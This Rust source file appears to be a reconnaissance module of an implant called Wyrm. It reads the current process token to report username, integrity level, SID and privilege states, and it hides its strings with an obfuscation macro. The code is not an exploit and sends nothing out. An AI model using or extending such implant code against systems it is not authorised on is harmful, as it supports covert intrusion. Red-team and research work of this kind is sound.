use std::{ffi::c_void, fmt::Display, mem::transmute, ptr::null_mut, slice::from_raw_parts};

use serde::Serialize;
use shared::{pretty_print::print_failed, tasks::WyrmResult};
use str_crypter::{decrypt_string, sc};
use windows_sys::{
    Win32::{
        Foundation::{CloseHandle, GetLastError, HANDLE, LUID, LocalFree},
        Globalization::lstrlenW,
        NetworkManagement::NetManagement::UNLEN,
        Security::{
            Authorization::ConvertSidToStringSidW, GetSidSubAuthority, GetSidSubAuthorityCount,
            GetTokenInformation, LookupAccountSidW, LookupPrivilegeNameW, PSID,
            SE_PRIVILEGE_ENABLED, SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_REMOVED,
            TOKEN_MANDATORY_LABEL, TOKEN_PRIVILEGES, TOKEN_QUERY, TOKEN_USER, TokenIntegrityLevel,
            TokenPrivileges, TokenUser,
        },
        System::{
            SystemServices::{
                SECURITY_MANDATORY_HIGH_RID, SECURITY_MANDATORY_LOW_RID,
                SECURITY_MANDATORY_MEDIUM_RID, SECURITY_MANDATORY_SYSTEM_RID,
                SECURITY_MANDATORY_UNTRUSTED_RID,
            },
            Threading::{GetCurrentProcess, OpenProcessToken},
            WindowsProgramming::GetUserNameW,
        },
    },
    core::PWSTR,
};

pub fn get_logged_in_username() -> Option<impl Serialize> {
    let buf = [0u16; UNLEN as usize];
    let mut len: u32 = UNLEN;
    let result = unsafe { GetUserNameW(PWSTR::from(buf.as_ptr() as *mut _), &mut len) };

    if result == 0 {
        #[cfg(debug_assertions)]
        println!("[-] Could not get logged in user details. {}", unsafe {
            GetLastError()
        });

        return None;
    }

    // Use the returned count of TCHARS (num chars not bytes) -1 for the null to get a String of the
    // username
    let un = if result == 0 || len == 0 {
        sc!("UNKNOWN", 75).unwrap()
    } else {
        String::from_utf16_lossy(&buf[0..len as usize - 1])
    };

    Some(un)
}

pub enum ProcessIntegrityLevel {
    Unknown,
    Untrusted,
    Low,
    Medium,
    High,
    System,
}

impl Display for ProcessIntegrityLevel {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ProcessIntegrityLevel::Untrusted => write!(f, "untrusted"),
            ProcessIntegrityLevel::Low => write!(f, "low"),
            ProcessIntegrityLevel::Medium => write!(f, "medium"),
            ProcessIntegrityLevel::High => write!(f, "high"),
            ProcessIntegrityLevel::System => write!(f, "system"),
            ProcessIntegrityLevel::Unknown => write!(f, "unknown"),
        }
    }
}

pub fn get_process_integrity_level() -> Option<ProcessIntegrityLevel> {
    let mut token_handle: HANDLE = HANDLE::default();

    if unsafe { OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token_handle) } == 0 {
        #[cfg(debug_assertions)]
        print_failed(format!("Failed to open process token. {:#X}", unsafe {
            GetLastError()
        }));

        return None;
    }

    let mut sz = 0;

    // purposefully fails
    let _ =
        unsafe { GetTokenInformation(token_handle, TokenIntegrityLevel, null_mut(), 0, &mut sz) };

    let buffer: Vec<u8> = Vec::with_capacity(sz as _);

    if unsafe {
        GetTokenInformation(
            token_handle,
            TokenIntegrityLevel,
            buffer.as_ptr() as *mut c_void,
            sz,
            &mut sz,
        )
    } == 0
    {
        #[cfg(debug_assertions)]
        print_failed(format!("Failed to GetTokenInformation2. {:#X}", unsafe {
            GetLastError()
        }));

        return None;
    };

    let token = unsafe { *transmute::<*const u8, *const TOKEN_MANDATORY_LABEL>(buffer.as_ptr()) };

    let count = unsafe { *GetSidSubAuthorityCount(token.Label.Sid) } as u32;
    let rid = unsafe { *GetSidSubAuthority(token.Label.Sid, count - 1) };

    if rid > i32::MAX as u32 {
        #[cfg(debug_assertions)]
        print_failed(format!(
            "RID was greater than i32 max, refusing to convert. Got: {rid}"
        ));

        return None;
    }

    match rid as i32 {
        SECURITY_MANDATORY_UNTRUSTED_RID => Some(ProcessIntegrityLevel::Untrusted),
        SECURITY_MANDATORY_LOW_RID => Some(ProcessIntegrityLevel::Low),
        SECURITY_MANDATORY_MEDIUM_RID => Some(ProcessIntegrityLevel::Medium),
        SECURITY_MANDATORY_HIGH_RID => Some(ProcessIntegrityLevel::High),
        SECURITY_MANDATORY_SYSTEM_RID => Some(ProcessIntegrityLevel::System),
        _ => {
            #[cfg(debug_assertions)]
            print_failed(format!("Could not match RID. Got: {rid}"));

            None
        }
    }
}

pub fn whoami() -> Option<impl Serialize> {
    let mut h_tok = null_mut();
    let res = unsafe { OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut h_tok) };

    if res == 0 {
        let s = format!(
            "{}",
            sc!("Failed to get token handle when querying token.", 74).unwrap()
        );
        unsafe { CloseHandle(h_tok) };
        return Some(WyrmResult::Err(s));
    }
    let mut sz = 0;

    // purposefully fails
    let _ = unsafe { GetTokenInformation(h_tok, TokenUser, null_mut(), 0, &mut sz) };

    let buffer: Vec<u8> = Vec::with_capacity(sz as _);

    if unsafe {
        GetTokenInformation(
            h_tok,
            TokenUser,
            buffer.as_ptr() as *mut c_void,
            sz,
            &mut sz,
        )
    } == 0
    {
        let s = format!(
            "{}. {:#X}",
            sc!("Failed to GetTokenInformation", 63).unwrap(),
            unsafe { GetLastError() }
        );

        unsafe { CloseHandle(h_tok) };
        return Some(WyrmResult::Err(s));
    };

    let token = unsafe { *transmute::<*const u8, *const TOKEN_USER>(buffer.as_ptr()) };

    let (user, domain) = match lookup_account_sid_w(token.User.Sid) {
        Ok((u, d)) => (u, d),
        Err(e) => {
            let s = format!(
                "{} {e:#X}",
                sc!("Failed to lookup account sid.", 91).unwrap()
            );

            unsafe { CloseHandle(h_tok) };
            return Some(WyrmResult::Err(s));
        }
    };

    let mut p_sid_str_raw = null_mut();
    let res = unsafe { ConvertSidToStringSidW(token.User.Sid, &mut p_sid_str_raw) };

    if res == 0 {
        let s = format!(
            "{} {:#X}",
            sc!("Error converting SID to String.", 51).unwrap(),
            unsafe { GetLastError() }
        );

        unsafe { CloseHandle(h_tok) };
        unsafe { LocalFree(p_sid_str_raw as *mut _) };

        return Some(WyrmResult::Err(s));
    }

    let sid_string = {
        let len = unsafe { lstrlenW(p_sid_str_raw) };
        if len > 0 {
            let slice = unsafe { from_raw_parts(p_sid_str_raw, len as _) };
            String::from_utf16_lossy(slice)
        } else {
            String::from("Error")
        }
    };

    unsafe { LocalFree(p_sid_str_raw as *mut _) };
    let mut msg = format!("{:<30} SID\n", sc!("Domain\\Username", 81).unwrap());
    msg.push_str(&format!("{:<30} -----\n", "----------------"));

    let domain_user_concat = format!("{}\\{}", domain, user);
    msg.push_str(&format!("{:<30} {}\n", domain_user_concat, sid_string));

    let permissions = match format_token_permissions(h_tok) {
        WyrmResult::Ok(p) => p,
        WyrmResult::Err(e) => {
            unsafe { CloseHandle(h_tok) };
            return Some(WyrmResult::Err(e));
        }
    };

    msg.push_str(&permissions);

    unsafe { CloseHandle(h_tok) };
    Some(WyrmResult::Ok(msg))
}

fn format_token_permissions(h_tok: *mut c_void) -> WyrmResult<String> {
    let mut sz = 0;

    // purposefully fails
    let _ = unsafe { GetTokenInformation(h_tok, TokenPrivileges, null_mut(), 0, &mut sz) };

    let buffer: Vec<u8> = Vec::with_capacity(sz as _);

    if unsafe {
        GetTokenInformation(
            h_tok,
            TokenPrivileges,
            buffer.as_ptr() as *mut c_void,
            sz,
            &mut sz,
        )
    } == 0
    {
        let s = format!(
            "{}. {:#X}",
            sc!("Failed to GetTokenInformation", 63).unwrap(),
            unsafe { GetLastError() }
        );

        unsafe { CloseHandle(h_tok) };
        return WyrmResult::Err(s);
    };

    let tp = buffer.as_ptr() as *const TOKEN_PRIVILEGES;
    let count = unsafe { (*tp).PrivilegeCount } as usize;

    let base = unsafe { (*tp).Privileges.as_ptr() };
    let entries = unsafe { std::slice::from_raw_parts(base, count) };

    let mut builder = String::new();
    builder.push_str(&format!("{:<60}\n", "-"));
    builder.push_str(&format!("{:<60}\n", "-"));
    builder.push_str(&format!("{:<60} State\n", "Privilege"));
    builder.push_str(&format!("{:<60} -------\n", "-----------"));

    for laa in entries {
        let luid = laa.Luid;
        let attr = laa.Attributes;
        let name = luid_to_name(&luid);
        let state = attrs_to_state(attr);
        builder.push_str(&format!("{:<60} {}\n", name, state));
    }

    WyrmResult::Ok(builder)
}

fn luid_to_name(luid: &LUID) -> String {
    let mut len: u32 = 0;

    let _ = unsafe { LookupPrivilegeNameW(null_mut(), luid, null_mut(), &mut len) };

    let mut buf: Vec<u16> = vec![0u16; len as usize];

    let res = unsafe { LookupPrivilegeNameW(null_mut(), luid, buf.as_mut_ptr(), &mut len) };

    if res == 0 {
        return format!("<LookupPrivilegeNameW failed: {:#X}>", unsafe {
            GetLastError()
        });
    }

    let len = unsafe { lstrlenW(buf.as_ptr()) };

    if len > 0 {
        let slice = unsafe { from_raw_parts(buf.as_ptr(), len as _) };
        String::from_utf16_lossy(slice)
    } else {
        String::from("Error")
    }
}

fn attrs_to_state(attrs: u32) -> &'static str {
    if (attrs & SE_PRIVILEGE_REMOVED) != 0 {
        "Removed"
    } else if (attrs & SE_PRIVILEGE_ENABLED) != 0 {
        "Enabled"
    } else if (attrs & SE_PRIVILEGE_ENABLED_BY_DEFAULT) != 0 {
        "Enabled by Default"
    } else {
        "Disabled"
    }
}

fn lookup_account_sid_w(psid: PSID) -> Result<(String, String), u32> {
    const BUF_SIZE: u32 = 1024;
    let mut name_sz: u32 = BUF_SIZE;
    let mut domain_sz: u32 = BUF_SIZE;

    let mut name_buf: Vec<u16> = vec![0; name_sz as usize];
    let mut domain_buf: Vec<u16> = vec![0; domain_sz as usize];

    let mut sid_name = 0;

    let result = unsafe {
        LookupAccountSidW(
            null_mut(),
            psid,
            name_buf.as_mut_ptr(),
            &mut name_sz,
            domain_buf.as_mut_ptr(),
            &mut domain_sz,
            &mut sid_name,
        )
    };

    if result != 0 {
        let name = String::from_utf16_lossy(&name_buf[..(name_sz as usize)]);
        let domain = String::from_utf16_lossy(&domain_buf[..(domain_sz as usize)]);
        return Ok((name, domain));
    }

    return Err(unsafe { GetLastError() });
}
